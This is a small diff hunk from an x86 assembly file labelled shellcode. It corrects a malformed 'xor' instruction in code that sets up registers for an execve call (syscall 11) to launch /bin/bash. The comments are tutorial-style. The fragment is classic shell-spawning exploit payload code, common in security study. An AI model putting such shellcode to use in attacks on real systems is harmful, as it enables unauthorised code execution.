@@ -38,7 +38,7 @@ shellcode:
 	lea ecx, [esi +10] ; this will load the address of /bin/bash + the nulls where the C's are
 	lea edx, [esi +14] ; this will load the address of the nulls
 	
-	xor, eax, eax ; this 0's out the register
+	xor eax, eax ; this 0's out the register
 	mov al, 0xb ; this will load the syscall # 11
 	
 	
